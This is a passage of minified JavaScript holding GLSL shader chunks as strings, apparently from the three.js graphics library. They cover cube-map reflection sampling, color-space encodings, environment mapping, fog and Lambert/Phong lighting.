v ) {\\n\\tmat3 tmp;\\n\\ttmp[0] = vec3(v[0].x, v[1].x, v[2].x);\\n\\ttmp[1] = vec3(v[0].y, v[1].y, v[2].y);\\n\\ttmp[2] = vec3(v[0].z, v[1].z, v[2].z);\\n\\treturn tmp;\\n}\\n\",\ncube_uv_reflection_fragment:\"#ifdef ENVMAP_TYPE_CUBE_UV\\n#define cubeUV_textureSize (1024.0)\\nint getFaceFromDirection(vec3 direction) {\\n\\tvec3 absDirection = abs(direction);\\n\\tint face = -1;\\n\\tif( absDirection.x > absDirection.z ) {\\n\\t\\tif(absDirection.x > absDirection.y )\\n\\t\\t\\tface = direction.x > 0.0 ? 0 : 3;\\n\\t\\telse\\n\\t\\t\\tface = direction.y > 0.0 ? 1 : 4;\\n\\t}\\n\\telse {\\n\\t\\tif(absDirection.z > absDirection.y )\\n\\t\\t\\tface = direction.z > 0.0 ? 2 : 5;\\n\\t\\telse\\n\\t\\t\\tface = direction.y > 0.0 ? 1 : 4;\\n\\t}\\n\\treturn face;\\n}\\n#define cubeUV_maxLods1  (log2(cubeUV_textureSize*0.25) - 1.0)\\n#define cubeUV_rangeClamp (exp2((6.0 - 1.0) * 2.0))\\nvec2 MipLevelInfo( vec3 vec, float roughnessLevel, float roughness ) {\\n\\tfloat scale = exp2(cubeUV_maxLods1 - roughnessLevel);\\n\\tfloat dxRoughness = dFdx(roughness);\\n\\tfloat dyRoughness = dFdy(roughness);\\n\\tvec3 dx = dFdx( vec * scale * dxRoughness );\\n\\tvec3 dy = dFdy( vec * scale * dyRoughness );\\n\\tfloat d = max( dot( dx, dx ), dot( dy, dy ) );\\n\\td = clamp(d, 1.0, cubeUV_rangeClamp);\\n\\tfloat mipLevel = 0.5 * log2(d);\\n\\treturn vec2(floor(mipLevel), fract(mipLevel));\\n}\\n#define cubeUV_maxLods2 (log2(cubeUV_textureSize*0.25) - 2.0)\\n#define cubeUV_rcpTextureSize (1.0 / cubeUV_textureSize)\\nvec2 getCubeUV(vec3 direction, float roughnessLevel, float mipLevel) {\\n\\tmipLevel = roughnessLevel > cubeUV_maxLods2 - 3.0 ? 0.0 : mipLevel;\\n\\tfloat a = 16.0 * cubeUV_rcpTextureSize;\\n\\tvec2 exp2_packed = exp2( vec2( roughnessLevel, mipLevel ) );\\n\\tvec2 rcp_exp2_packed = vec2( 1.0 ) / exp2_packed;\\n\\tfloat powScale = exp2_packed.x * exp2_packed.y;\\n\\tfloat scale = rcp_exp2_packed.x * rcp_exp2_packed.y * 0.25;\\n\\tfloat mipOffset = 0.75*(1.0 - rcp_exp2_packed.y) * rcp_exp2_packed.x;\\n\\tbool bRes = mipLevel == 0.0;\\n\\tscale =  bRes && (scale < a) ? a : scale;\\n\\tvec3 r;\\n\\tvec2 offset;\\n\\tint face = getFaceFromDirection(direction);\\n\\tfloat rcpPowScale = 1.0 / powScale;\\n\\tif( face == 0) {\\n\\t\\tr = vec3(direction.x, -direction.z, direction.y);\\n\\t\\toffset = vec2(0.0+mipOffset,0.75 * rcpPowScale);\\n\\t\\toffset.y = bRes && (offset.y < 2.0*a) ? a : offset.y;\\n\\t}\\n\\telse if( face == 1) {\\n\\t\\tr = vec3(direction.y, direction.x, direction.z);\\n\\t\\toffset = vec2(scale+mipOffset, 0.75 * rcpPowScale);\\n\\t\\toffset.y = bRes && (offset.y < 2.0*a) ? a : offset.y;\\n\\t}\\n\\telse if( face == 2) {\\n\\t\\tr = vec3(direction.z, direction.x, direction.y);\\n\\t\\toffset = vec2(2.0*scale+mipOffset, 0.75 * rcpPowScale);\\n\\t\\toffset.y = bRes && (offset.y < 2.0*a) ? a : offset.y;\\n\\t}\\n\\telse if( face == 3) {\\n\\t\\tr = vec3(direction.x, direction.z, direction.y);\\n\\t\\toffset = vec2(0.0+mipOffset,0.5 * rcpPowScale);\\n\\t\\toffset.y = bRes && (offset.y < 2.0*a) ? 0.0 : offset.y;\\n\\t}\\n\\telse if( face == 4) {\\n\\t\\tr = vec3(direction.y, direction.x, -direction.z);\\n\\t\\toffset = vec2(scale+mipOffset, 0.5 * rcpPowScale);\\n\\t\\toffset.y = bRes && (offset.y < 2.0*a) ? 0.0 : offset.y;\\n\\t}\\n\\telse {\\n\\t\\tr = vec3(direction.z, -direction.x, direction.y);\\n\\t\\toffset = vec2(2.0*scale+mipOffset, 0.5 * rcpPowScale);\\n\\t\\toffset.y = bRes && (offset.y < 2.0*a) ? 0.0 : offset.y;\\n\\t}\\n\\tr = normalize(r);\\n\\tfloat texelOffset = 0.5 * cubeUV_rcpTextureSize;\\n\\tvec2 s = ( r.yz / abs( r.x ) + vec2( 1.0 ) ) * 0.5;\\n\\tvec2 base = offset + vec2( texelOffset );\\n\\treturn base + s * ( scale - 2.0 * texelOffset );\\n}\\n#define cubeUV_maxLods3 (log2(cubeUV_textureSize*0.25) - 3.0)\\nvec4 textureCubeUV(vec3 reflectedDirection, float roughness ) {\\n\\tfloat roughnessVal = roughness* cubeUV_maxLods3;\\n\\tfloat r1 = floor(roughnessVal);\\n\\tfloat r2 = r1 + 1.0;\\n\\tfloat t = fract(roughnessVal);\\n\\tvec2 mipInfo = MipLevelInfo(reflectedDirection, r1, roughness);\\n\\tfloat s = mipInfo.y;\\n\\tfloat level0 = mipInfo.x;\\n\\tfloat level1 = level0 + 1.0;\\n\\tlevel1 = level1 > 5.0 ? 5.0 : level1;\\n\\tlevel0 += min( floor( s + 0.5 ), 5.0 );\\n\\tvec2 uv_10 = getCubeUV(reflectedDirection, r1, level0);\\n\\tvec4 color10 = envMapTexelToLinear(texture2D(envMap, uv_10));\\n\\tvec2 uv_20 = getCubeUV(reflectedDirection, r2, level0);\\n\\tvec4 color20 = envMapTexelToLinear(texture2D(envMap, uv_20));\\n\\tvec4 result = mix(color10, color20, t);\\n\\treturn vec4(result.rgb, 1.0);\\n}\\n#endif\\n\",\ndefaultnormal_vertex:\"#ifdef FLIP_SIDED\\n\\tobjectNormal = -objectNormal;\\n#endif\\nvec3 transformedNormal = normalMatrix * objectNormal;\\n\",displacementmap_pars_vertex:\"#ifdef USE_DISPLACEMENTMAP\\n\\tuniform sampler2D displacementMap;\\n\\tuniform float displacementScale;\\n\\tuniform float displacementBias;\\n#endif\\n\",displacementmap_vertex:\"#ifdef USE_DISPLACEMENTMAP\\n\\ttransformed += normal * ( texture2D( displacementMap, uv ).x * displacementScale + displacementBias );\\n#endif\\n\",emissivemap_fragment:\"#ifdef USE_EMISSIVEMAP\\n\\tvec4 emissiveColor = texture2D( emissiveMap, vUv );\\n\\temissiveColor.rgb = emissiveMapTexelToLinear( emissiveColor ).rgb;\\n\\ttotalEmissiveRadiance *= emissiveColor.rgb;\\n#endif\\n\",\nemissivemap_pars_fragment:\"#ifdef USE_EMISSIVEMAP\\n\\tuniform sampler2D emissiveMap;\\n#endif\\n\",encodings_fragment:\"  gl_FragColor = linearToOutputTexel( gl_FragColor );\\n\",encodings_pars_fragment:\"\\nvec4 LinearToLinear( in vec4 value ) {\\n\\treturn value;\\n}\\nvec4 GammaToLinear( in vec4 value, in float gammaFactor ) {\\n\\treturn vec4( pow( value.xyz, vec3( gammaFactor ) ), value.w );\\n}\\nvec4 LinearToGamma( in vec4 value, in float gammaFactor ) {\\n\\treturn vec4( pow( value.xyz, vec3( 1.0 / gammaFactor ) ), value.w );\\n}\\nvec4 sRGBToLinear( in vec4 value ) {\\n\\treturn vec4( mix( pow( value.rgb * 0.9478672986 + vec3( 0.0521327014 ), vec3( 2.4 ) ), value.rgb * 0.0773993808, vec3( lessThanEqual( value.rgb, vec3( 0.04045 ) ) ) ), value.w );\\n}\\nvec4 LinearTosRGB( in vec4 value ) {\\n\\treturn vec4( mix( pow( value.rgb, vec3( 0.41666 ) ) * 1.055 - vec3( 0.055 ), value.rgb * 12.92, vec3( lessThanEqual( value.rgb, vec3( 0.0031308 ) ) ) ), value.w );\\n}\\nvec4 RGBEToLinear( in vec4 value ) {\\n\\treturn vec4( value.rgb * exp2( value.a * 255.0 - 128.0 ), 1.0 );\\n}\\nvec4 LinearToRGBE( in vec4 value ) {\\n\\tfloat maxComponent = max( max( value.r, value.g ), value.b );\\n\\tfloat fExp = clamp( ceil( log2( maxComponent ) ), -128.0, 127.0 );\\n\\treturn vec4( value.rgb / exp2( fExp ), ( fExp + 128.0 ) / 255.0 );\\n}\\nvec4 RGBMToLinear( in vec4 value, in float maxRange ) {\\n\\treturn vec4( value.xyz * value.w * maxRange, 1.0 );\\n}\\nvec4 LinearToRGBM( in vec4 value, in float maxRange ) {\\n\\tfloat maxRGB = max( value.x, max( value.g, value.b ) );\\n\\tfloat M      = clamp( maxRGB / maxRange, 0.0, 1.0 );\\n\\tM            = ceil( M * 255.0 ) / 255.0;\\n\\treturn vec4( value.rgb / ( M * maxRange ), M );\\n}\\nvec4 RGBDToLinear( in vec4 value, in float maxRange ) {\\n\\treturn vec4( value.rgb * ( ( maxRange / 255.0 ) / value.a ), 1.0 );\\n}\\nvec4 LinearToRGBD( in vec4 value, in float maxRange ) {\\n\\tfloat maxRGB = max( value.x, max( value.g, value.b ) );\\n\\tfloat D      = max( maxRange / maxRGB, 1.0 );\\n\\tD            = min( floor( D ) / 255.0, 1.0 );\\n\\treturn vec4( value.rgb * ( D * ( 255.0 / maxRange ) ), D );\\n}\\nconst mat3 cLogLuvM = mat3( 0.2209, 0.3390, 0.4184, 0.1138, 0.6780, 0.7319, 0.0102, 0.1130, 0.2969 );\\nvec4 LinearToLogLuv( in vec4 value )  {\\n\\tvec3 Xp_Y_XYZp = value.rgb * cLogLuvM;\\n\\tXp_Y_XYZp = max(Xp_Y_XYZp, vec3(1e-6, 1e-6, 1e-6));\\n\\tvec4 vResult;\\n\\tvResult.xy = Xp_Y_XYZp.xy / Xp_Y_XYZp.z;\\n\\tfloat Le = 2.0 * log2(Xp_Y_XYZp.y) + 127.0;\\n\\tvResult.w = fract(Le);\\n\\tvResult.z = (Le - (floor(vResult.w*255.0))/255.0)/255.0;\\n\\treturn vResult;\\n}\\nconst mat3 cLogLuvInverseM = mat3( 6.0014, -2.7008, -1.7996, -1.3320, 3.1029, -5.7721, 0.3008, -1.0882, 5.6268 );\\nvec4 LogLuvToLinear( in vec4 value ) {\\n\\tfloat Le = value.z * 255.0 + value.w;\\n\\tvec3 Xp_Y_XYZp;\\n\\tXp_Y_XYZp.y = exp2((Le - 127.0) / 2.0);\\n\\tXp_Y_XYZp.z = Xp_Y_XYZp.y / value.y;\\n\\tXp_Y_XYZp.x = value.x * Xp_Y_XYZp.z;\\n\\tvec3 vRGB = Xp_Y_XYZp.rgb * cLogLuvInverseM;\\n\\treturn vec4( max(vRGB, 0.0), 1.0 );\\n}\\n\",\nenvmap_fragment:\"#ifdef USE_ENVMAP\\n\\t#if defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( PHONG )\\n\\t\\tvec3 cameraToVertex = normalize( vWorldPosition - cameraPosition );\\n\\t\\tvec3 worldNormal = inverseTransformDirection( normal, viewMatrix );\\n\\t\\t#ifdef ENVMAP_MODE_REFLECTION\\n\\t\\t\\tvec3 reflectVec = reflect( cameraToVertex, worldNormal );\\n\\t\\t#else\\n\\t\\t\\tvec3 reflectVec = refract( cameraToVertex, worldNormal, refractionRatio );\\n\\t\\t#endif\\n\\t#else\\n\\t\\tvec3 reflectVec = vReflect;\\n\\t#endif\\n\\t#ifdef ENVMAP_TYPE_CUBE\\n\\t\\tvec4 envColor = textureCube( envMap, flipNormal * vec3( flipEnvMap * reflectVec.x, reflectVec.yz ) );\\n\\t#elif defined( ENVMAP_TYPE_EQUIREC )\\n\\t\\tvec2 sampleUV;\\n\\t\\tsampleUV.y = saturate( flipNormal * reflectVec.y * 0.5 + 0.5 );\\n\\t\\tsampleUV.x = atan( flipNormal * reflectVec.z, flipNormal * reflectVec.x ) * RECIPROCAL_PI2 + 0.5;\\n\\t\\tvec4 envColor = texture2D( envMap, sampleUV );\\n\\t#elif defined( ENVMAP_TYPE_SPHERE )\\n\\t\\tvec3 reflectView = flipNormal * normalize( ( viewMatrix * vec4( reflectVec, 0.0 ) ).xyz + vec3( 0.0, 0.0, 1.0 ) );\\n\\t\\tvec4 envColor = texture2D( envMap, reflectView.xy * 0.5 + 0.5 );\\n\\t#else\\n\\t\\tvec4 envColor = vec4( 0.0 );\\n\\t#endif\\n\\tenvColor = envMapTexelToLinear( envColor );\\n\\t#ifdef ENVMAP_BLENDING_MULTIPLY\\n\\t\\toutgoingLight = mix( outgoingLight, outgoingLight * envColor.xyz, specularStrength * reflectivity );\\n\\t#elif defined( ENVMAP_BLENDING_MIX )\\n\\t\\toutgoingLight = mix( outgoingLight, envColor.xyz, specularStrength * reflectivity );\\n\\t#elif defined( ENVMAP_BLENDING_ADD )\\n\\t\\toutgoingLight += envColor.xyz * specularStrength * reflectivity;\\n\\t#endif\\n#endif\\n\",\nenvmap_pars_fragment:\"#if defined( USE_ENVMAP ) || defined( PHYSICAL )\\n\\tuniform float reflectivity;\\n\\tuniform float envMapIntensity;\\n#endif\\n#ifdef USE_ENVMAP\\n\\t#if ! defined( PHYSICAL ) && ( defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( PHONG ) )\\n\\t\\tvarying vec3 vWorldPosition;\\n\\t#endif\\n\\t#ifdef ENVMAP_TYPE_CUBE\\n\\t\\tuniform samplerCube envMap;\\n\\t#else\\n\\t\\tuniform sampler2D envMap;\\n\\t#endif\\n\\tuniform float flipEnvMap;\\n\\t#if defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( PHONG ) || defined( PHYSICAL )\\n\\t\\tuniform float refractionRatio;\\n\\t#else\\n\\t\\tvarying vec3 vReflect;\\n\\t#endif\\n#endif\\n\",\nenvmap_pars_vertex:\"#ifdef USE_ENVMAP\\n\\t#if defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( PHONG )\\n\\t\\tvarying vec3 vWorldPosition;\\n\\t#else\\n\\t\\tvarying vec3 vReflect;\\n\\t\\tuniform float refractionRatio;\\n\\t#endif\\n#endif\\n\",envmap_vertex:\"#ifdef USE_ENVMAP\\n\\t#if defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( PHONG )\\n\\t\\tvWorldPosition = worldPosition.xyz;\\n\\t#else\\n\\t\\tvec3 cameraToVertex = normalize( worldPosition.xyz - cameraPosition );\\n\\t\\tvec3 worldNormal = inverseTransformDirection( transformedNormal, viewMatrix );\\n\\t\\t#ifdef ENVMAP_MODE_REFLECTION\\n\\t\\t\\tvReflect = reflect( cameraToVertex, worldNormal );\\n\\t\\t#else\\n\\t\\t\\tvReflect = refract( cameraToVertex, worldNormal, refractionRatio );\\n\\t\\t#endif\\n\\t#endif\\n#endif\\n\",\nfog_vertex:\"\\n#ifdef USE_FOG\\nfogDepth = -mvPosition.z;\\n#endif\",fog_pars_vertex:\"#ifdef USE_FOG\\n  varying float fogDepth;\\n#endif\\n\",fog_fragment:\"#ifdef USE_FOG\\n\\t#ifdef FOG_EXP2\\n\\t\\tfloat fogFactor = whiteCompliment( exp2( - fogDensity * fogDensity * fogDepth * fogDepth * LOG2 ) );\\n\\t#else\\n\\t\\tfloat fogFactor = smoothstep( fogNear, fogFar, fogDepth );\\n\\t#endif\\n\\tgl_FragColor.rgb = mix( gl_FragColor.rgb, fogColor, fogFactor );\\n#endif\\n\",fog_pars_fragment:\"#ifdef USE_FOG\\n\\tuniform vec3 fogColor;\\n\\tvarying float fogDepth;\\n\\t#ifdef FOG_EXP2\\n\\t\\tuniform float fogDensity;\\n\\t#else\\n\\t\\tuniform float fogNear;\\n\\t\\tuniform float fogFar;\\n\\t#endif\\n#endif\\n\",\ngradientmap_pars_fragment:\"#ifdef TOON\\n\\tuniform sampler2D gradientMap;\\n\\tvec3 getGradientIrradiance( vec3 normal, vec3 lightDirection ) {\\n\\t\\tfloat dotNL = dot( normal, lightDirection );\\n\\t\\tvec2 coord = vec2( dotNL * 0.5 + 0.5, 0.0 );\\n\\t\\t#ifdef USE_GRADIENTMAP\\n\\t\\t\\treturn texture2D( gradientMap, coord ).rgb;\\n\\t\\t#else\\n\\t\\t\\treturn ( coord.x < 0.7 ) ? vec3( 0.7 ) : vec3( 1.0 );\\n\\t\\t#endif\\n\\t}\\n#endif\\n\",lightmap_fragment:\"#ifdef USE_LIGHTMAP\\n\\treflectedLight.indirectDiffuse += PI * texture2D( lightMap, vUv2 ).xyz * lightMapIntensity;\\n#endif\\n\",\nlightmap_pars_fragment:\"#ifdef USE_LIGHTMAP\\n\\tuniform sampler2D lightMap;\\n\\tuniform float lightMapIntensity;\\n#endif\",lights_lambert_vertex:\"vec3 diffuse = vec3( 1.0 );\\nGeometricContext geometry;\\ngeometry.position = mvPosition.xyz;\\ngeometry.normal = normalize( transformedNormal );\\ngeometry.viewDir = normalize( -mvPosition.xyz );\\nGeometricContext backGeometry;\\nbackGeometry.position = geometry.position;\\nbackGeometry.normal = -geometry.normal;\\nbackGeometry.viewDir = geometry.viewDir;\\nvLightFront = vec3( 0.0 );\\n#ifdef DOUBLE_SIDED\\n\\tvLightBack = vec3( 0.0 );\\n#endif\\nIncidentLight directLight;\\nfloat dotNL;\\nvec3 directLightColor_Diffuse;\\n#if NUM_POINT_LIGHTS > 0\\n\\tfor ( int i = 0; i < NUM_POINT_LIGHTS; i ++ ) {\\n\\t\\tgetPointDirectLightIrradiance( pointLights[ i ], geometry, directLight );\\n\\t\\tdotNL = dot( geometry.normal, directLight.direction );\\n\\t\\tdirectLightColor_Diffuse = PI * directLight.color;\\n\\t\\tvLightFront += saturate( dotNL ) * directLightColor_Diffuse;\\n\\t\\t#ifdef DOUBLE_SIDED\\n\\t\\t\\tvLightBack += saturate( -dotNL ) * directLightColor_Diffuse;\\n\\t\\t#endif\\n\\t}\\n#endif\\n#if NUM_SPOT_LIGHTS > 0\\n\\tfor ( int i = 0; i < NUM_SPOT_LIGHTS; i ++ ) {\\n\\t\\tgetSpotDirectLightIrradiance( spotLights[ i ], geometry, directLight );\\n\\t\\tdotNL = dot( geometry.normal, directLight.direction );\\n\\t\\tdirectLightColor_Diffuse = PI * directLight.color;\\n\\t\\tvLightFront += saturate( dotNL ) * directLightColor_Diffuse;\\n\\t\\t#ifdef DOUBLE_SIDED\\n\\t\\t\\tvLightBack += saturate( -dotNL ) * directLightColor_Diffuse;\\n\\t\\t#endif\\n\\t}\\n#endif\\n#if NUM_DIR_LIGHTS > 0\\n\\tfor ( int i = 0; i < NUM_DIR_LIGHTS; i ++ ) {\\n\\t\\tgetDirectionalDirectLightIrradiance( directionalLights[ i ], geometry, directLight );\\n\\t\\tdotNL = dot( geometry.normal, directLight.direction );\\n\\t\\tdirectLightColor_Diffuse = PI * directLight.color;\\n\\t\\tvLightFront += saturate( dotNL ) * directLightColor_Diffuse;\\n\\t\\t#ifdef DOUBLE_SIDED\\n\\t\\t\\tvLightBack += saturate( -dotNL ) * directLightColor_Diffuse;\\n\\t\\t#endif\\n\\t}\\n#endif\\n#if NUM_HEMI_LIGHTS > 0\\n\\tfor ( int i = 0; i < NUM_HEMI_LIGHTS; i ++ ) {\\n\\t\\tvLightFront += getHemisphereLightIrradiance( hemisphereLights[ i ], geometry );\\n\\t\\t#ifdef DOUBLE_SIDED\\n\\t\\t\\tvLightBack += getHemisphereLightIrradiance( hemisphereLights[ i ], backGeometry );\\n\\t\\t#endif\\n\\t}\\n#endif\\n\",\nlights_pars:\"uniform vec3 ambientLightColor;\\nvec3 getAmbientLightIrradiance( const in vec3 ambientLightColor ) {\\n\\tvec3 irradiance = ambientLightColor;\\n\\t#ifndef PHYSICALLY_CORRECT_LIGHTS\\n\\t\\tirradiance *= PI;\\n\\t#endif\\n\\treturn irradiance;\\n}\\n#if NUM_DIR_LIGHTS > 0\\n\\tstruct DirectionalLight {\\n\\t\\tvec3 direction;\\n\\t\\tvec3 color;\\n\\t\\tint shadow;\\n\\t\\tfloat shadowBias;\\n\\t\\tfloat shadowRadius;\\n\\t\\tvec2 shadowMapSize;\\n\\t};\\n\\tuniform DirectionalLight directionalLights[ NUM_DIR_LIGHTS ];\\n\\tvoid getDirectionalDirectLightIrradiance( const in DirectionalLight directionalLight, const in GeometricContext geometry, out IncidentLight directLight ) {\\n\\t\\tdirectLight.color = directionalLight.color;\\n\\t\\tdirectLight.direction = directionalLight.direction;\\n\\t\\tdirectLight.visible = true;\\n\\t}\\n#endif\\n#if NUM_POINT_LIGHTS > 0\\n\\tstruct PointLight {\\n\\t\\tvec3 position;\\n\\t\\tvec3 color;\\n\\t\\tfloat distance;\\n\\t\\tfloat decay;\\n\\t\\tint shadow;\\n\\t\\tfloat shadowBias;\\n\\t\\tfloat shadowRadius;\\n\\t\\tvec2 shadowMapSize;\\n\\t};\\n\\tuniform PointLight pointLights[ NUM_POINT_LIGHTS ];\\n\\tvoid getPointDirectLightIrradiance( const in PointLight pointLight, const in GeometricContext geometry, out IncidentLight directLight ) {\\n\\t\\tvec3 lVector = pointLight.position - geometry.position;\\n\\t\\tdirectLight.direction = normalize( lVector );\\n\\t\\tfloat lightDistance = length( lVector );\\n\\t\\tdirectLight.color = pointLight.color;\\n\\t\\tdirectLight.color *= punctualLightIntensityToIrradianceFactor( lightDistance, pointLight.distance, pointLight.decay );\\n\\t\\tdirectLight.visible = ( directLight.color != vec3( 0.0 ) );\\n\\t}\\n#endif\\n#if NUM_SPOT_LIGHTS > 0\\n\\tstruct SpotLight {\\n\\t\\tvec3 position;\\n\\t\\tvec3 direction;\\n\\t\\tvec3 color;\\n\\t\\tfloat distance;\\n\\t\\tfloat decay;\\n\\t\\tfloat coneCos;\\n\\t\\tfloat penumbraCos;\\n\\t\\tint shadow;\\n\\t\\tfloat shadowBias;\\n\\t\\tfloat shadowRadius;\\n\\t\\tvec2 shadowMapSize;\\n\\t};\\n\\tuniform SpotLight spotLights[ NUM_SPOT_LIGHTS ];\\n\\tvoid getSpotDirectLightIrradiance( const in SpotLight spotLight, const in GeometricContext geometry, out IncidentLight directLight  ) {\\n\\t\\tvec3 lVector = spotLight.position - geometry.position;\\n\\t\\tdirectLight.direction = normalize( lVector );\\n\\t\\tfloat lightDistance = length( lVector );\\n\\t\\tfloat angleCos = dot( directLight.direction, spotLight.direction );\\n\\t\\tif ( angleCos > spotLight.coneCos ) {\\n\\t\\t\\tfloat spotEffect = smoothstep( spotLight.coneCos, spotLight.penumbraCos, angleCos );\\n\\t\\t\\tdirectLight.color = spotLight.color;\\n\\t\\t\\tdirectLight.color *= spotEffect * punctualLightIntensityToIrradianceFactor( lightDistance, spotLight.distance, spotLight.decay );\\n\\t\\t\\tdirectLight.visible = true;\\n\\t\\t} else {\\n\\t\\t\\tdirectLight.color = vec3( 0.0 );\\n\\t\\t\\tdirectLight.visible = false;\\n\\t\\t}\\n\\t}\\n#endif\\n#if NUM_RECT_AREA_LIGHTS > 0\\n\\tstruct RectAreaLight {\\n\\t\\tvec3 color;\\n\\t\\tvec3 position;\\n\\t\\tvec3 halfWidth;\\n\\t\\tvec3 halfHeight;\\n\\t};\\n\\tuniform sampler2D ltcMat;\\tuniform sampler2D ltcMag;\\n\\tuniform RectAreaLight rectAreaLights[ NUM_RECT_AREA_LIGHTS ];\\n#endif\\n#if NUM_HEMI_LIGHTS > 0\\n\\tstruct HemisphereLight {\\n\\t\\tvec3 direction;\\n\\t\\tvec3 skyColor;\\n\\t\\tvec3 groundColor;\\n\\t};\\n\\tuniform HemisphereLight hemisphereLights[ NUM_HEMI_LIGHTS ];\\n\\tvec3 getHemisphereLightIrradiance( const in HemisphereLight hemiLight, const in GeometricContext geometry ) {\\n\\t\\tfloat dotNL = dot( geometry.normal, hemiLight.direction );\\n\\t\\tfloat hemiDiffuseWeight = 0.5 * dotNL + 0.5;\\n\\t\\tvec3 irradiance = mix( hemiLight.groundColor, hemiLight.skyColor, hemiDiffuseWeight );\\n\\t\\t#ifndef PHYSICALLY_CORRECT_LIGHTS\\n\\t\\t\\tirradiance *= PI;\\n\\t\\t#endif\\n\\t\\treturn irradiance;\\n\\t}\\n#endif\\n#if defined( USE_ENVMAP ) && defined( PHYSICAL )\\n\\tvec3 getLightProbeIndirectIrradiance( const in GeometricContext geometry, const in int maxMIPLevel ) {\\n\\t\\tvec3 worldNormal = inverseTransformDirection( geometry.normal, viewMatrix );\\n\\t\\t#ifdef ENVMAP_TYPE_CUBE\\n\\t\\t\\tvec3 queryVec = vec3( flipEnvMap * worldNormal.x, worldNormal.yz );\\n\\t\\t\\t#ifdef TEXTURE_LOD_EXT\\n\\t\\t\\t\\tvec4 envMapColor = textureCubeLodEXT( envMap, queryVec, float( maxMIPLevel ) );\\n\\t\\t\\t#else\\n\\t\\t\\t\\tvec4 envMapColor = textureCube( envMap, queryVec, float( maxMIPLevel ) );\\n\\t\\t\\t#endif\\n\\t\\t\\tenvMapColor.rgb = envMapTexelToLinear( envMapColor ).rgb;\\n\\t\\t#elif defined( ENVMAP_TYPE_CUBE_UV )\\n\\t\\t\\tvec3 queryVec = vec3( flipEnvMap * worldNormal.x, worldNormal.yz );\\n\\t\\t\\tvec4 envMapColor = textureCubeUV( queryVec, 1.0 );\\n\\t\\t#else\\n\\t\\t\\tvec4 envMapColor = vec4( 0.0 );\\n\\t\\t#endif\\n\\t\\treturn PI * envMapColor.rgb * envMapIntensity;\\n\\t}\\n\\tfloat getSpecularMIPLevel( const in float blinnShininessExponent, const in int maxMIPLevel ) {\\n\\t\\tfloat maxMIPLevelScalar = float( maxMIPLevel );\\n\\t\\tfloat desiredMIPLevel = maxMIPLevelScalar - 0.79248 - 0.5 * log2( pow2( blinnShininessExponent ) + 1.0 );\\n\\t\\treturn clamp( desiredMIPLevel, 0.0, maxMIPLevelScalar );\\n\\t}\\n\\tvec3 getLightProbeIndirectRadiance( const in GeometricContext geometry, const in float blinnShininessExponent, const in int maxMIPLevel ) {\\n\\t\\t#ifdef ENVMAP_MODE_REFLECTION\\n\\t\\t\\tvec3 reflectVec = reflect( -geometry.viewDir, geometry.normal );\\n\\t\\t#else\\n\\t\\t\\tvec3 reflectVec = refract( -geometry.viewDir, geometry.normal, refractionRatio );\\n\\t\\t#endif\\n\\t\\treflectVec = inverseTransformDirection( reflectVec, viewMatrix );\\n\\t\\tfloat specularMIPLevel = getSpecularMIPLevel( blinnShininessExponent, maxMIPLevel );\\n\\t\\t#ifdef ENVMAP_TYPE_CUBE\\n\\t\\t\\tvec3 queryReflectVec = vec3( flipEnvMap * reflectVec.x, reflectVec.yz );\\n\\t\\t\\t#ifdef TEXTURE_LOD_EXT\\n\\t\\t\\t\\tvec4 envMapColor = textureCubeLodEXT( envMap, queryReflectVec, specularMIPLevel );\\n\\t\\t\\t#else\\n\\t\\t\\t\\tvec4 envMapColor = textureCube( envMap, queryReflectVec, specularMIPLevel );\\n\\t\\t\\t#endif\\n\\t\\t\\tenvMapColor.rgb = envMapTexelToLinear( envMapColor ).rgb;\\n\\t\\t#elif defined( ENVMAP_TYPE_CUBE_UV )\\n\\t\\t\\tvec3 queryReflectVec = vec3( flipEnvMap * reflectVec.x, reflectVec.yz );\\n\\t\\t\\tvec4 envMapColor = textureCubeUV(queryReflectVec, BlinnExponentToGGXRoughness(blinnShininessExponent));\\n\\t\\t#elif defined( ENVMAP_TYPE_EQUIREC )\\n\\t\\t\\tvec2 sampleUV;\\n\\t\\t\\tsampleUV.y = saturate( reflectVec.y * 0.5 + 0.5 );\\n\\t\\t\\tsampleUV.x = atan( reflectVec.z, reflectVec.x ) * RECIPROCAL_PI2 + 0.5;\\n\\t\\t\\t#ifdef TEXTURE_LOD_EXT\\n\\t\\t\\t\\tvec4 envMapColor = texture2DLodEXT( envMap, sampleUV, specularMIPLevel );\\n\\t\\t\\t#else\\n\\t\\t\\t\\tvec4 envMapColor = texture2D( envMap, sampleUV, specularMIPLevel );\\n\\t\\t\\t#endif\\n\\t\\t\\tenvMapColor.rgb = envMapTexelToLinear( envMapColor ).rgb;\\n\\t\\t#elif defined( ENVMAP_TYPE_SPHERE )\\n\\t\\t\\tvec3 reflectView = normalize( ( viewMatrix * vec4( reflectVec, 0.0 ) ).xyz + vec3( 0.0,0.0,1.0 ) );\\n\\t\\t\\t#ifdef TEXTURE_LOD_EXT\\n\\t\\t\\t\\tvec4 envMapColor = texture2DLodEXT( envMap, reflectView.xy * 0.5 + 0.5, specularMIPLevel );\\n\\t\\t\\t#else\\n\\t\\t\\t\\tvec4 envMapColor = texture2D( envMap, reflectView.xy * 0.5 + 0.5, specularMIPLevel );\\n\\t\\t\\t#endif\\n\\t\\t\\tenvMapColor.rgb = envMapTexelToLinear( envMapColor ).rgb;\\n\\t\\t#endif\\n\\t\\treturn envMapColor.rgb * envMapIntensity;\\n\\t}\\n#endif\\n\",\nlights_phong_fragment:\"BlinnPhongMaterial material;\\nmaterial.diffuseColor = diffuseColor.rgb;\\nmaterial.specularColor = specular;\\nmaterial.specularShininess = shininess;\\nmaterial.specularStrength = specularStrength;\\n\",lights_phong_pars_fragment:\"varying vec3 vViewPosition;\\n#ifndef FLAT_SHADED\\n\\tvarying vec3 vNormal;\\n#endif\\nstruct BlinnPhongMaterial {\\n\\tvec3\\tdiffuseColor;\\n\\tvec3\\tspecularColor;\\n\\tfloat\\tspecularShininess;\\n\\tfloat\\tspecularStrength;\\n};\\n#if NUM_RECT_AREA_LIGHTS > 0\\n\\tvoid RE_Direct_RectArea_BlinnPhong( const in RectAreaLight rectAreaLight, const in GeometricContext geometry, const in BlinnPhongMaterial material, inout ReflectedLight reflectedLight ) {\\n\\t\\tvec3 matDiffColor = material.diffuseColor;\\n\\t\\tvec3 matSpecColor = material.specularColor;\\n\\t\\tvec3 lightColor   = rectAreaLight.color;\\n\\t\\tfloat roughness = 